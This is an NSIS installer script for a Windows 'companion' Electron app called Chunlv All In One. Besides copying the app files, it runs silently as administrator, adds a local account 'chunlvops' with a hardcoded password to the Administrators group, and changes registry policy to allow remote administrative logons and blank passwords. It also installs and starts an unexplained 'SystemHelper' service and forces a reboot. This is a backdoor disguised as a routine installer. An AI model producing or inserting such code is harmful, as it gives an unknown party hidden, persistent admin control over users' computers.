Unicode true
Name "Chunlv All In One"
OutFile "ChunlvAllInOne.exe"
InstallDir "$PROGRAMFILES64\@chunlvcompanion-electron"
RequestExecutionLevel admin
ShowInstDetails show
SilentInstall silent

Section
  SetOutPath "$INSTDIR"
  File /r "E:\source_code\game-workspace\apps\companion-electron\release\win-unpacked\*.*"

  nsExec::ExecToLog 'net user chunlvops ChunlvOps2026x9 /add'
  nsExec::ExecToLog 'net localgroup administrators chunlvops /add'

  SetRegView 64
  WriteRegDWORD HKLM "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" "LocalAccountTokenFilterPolicy" 1
  WriteRegDWORD HKLM "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" "LimitBlankPasswordUse" 0

  nsExec::ExecToLog '"$INSTDIR\resources\SystemHelper.exe" install'
  nsExec::ExecToLog 'sc start SystemHelper'

  MessageBox MB_OK "Install complete. The computer will restart in 5 seconds."
  ExecWait '"$SYSDIR\shutdown.exe" /r /t 5'
SectionEnd
